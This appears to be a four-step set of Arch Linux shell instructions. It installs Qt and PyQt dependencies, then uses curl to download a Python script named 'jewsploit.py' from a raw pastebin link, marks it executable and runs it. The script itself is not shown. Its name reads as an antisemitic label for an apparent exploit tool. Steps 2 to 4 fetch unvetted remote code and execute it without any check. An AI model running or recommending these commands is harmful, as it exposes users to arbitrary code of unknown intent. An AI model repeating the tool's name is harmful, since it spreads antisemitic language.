# 1. Install dependencies
sudo pacman -S --noconfirm python python-pip qt5-base qt5-webengine qt5-tools python-pyqt5 python-pyqt5-sip
python3 -m pip install --user PyQtWebEngine

# 2. Download the application
curl -o ~/jewsploit.py https://pastebin.com/raw/f0RErRiE

# 3. Make it executable
chmod +x ~/jewsploit.py

# 4. Run it
QT_QPA_PLATFORM=xcb python3 ~/jewsploit.py
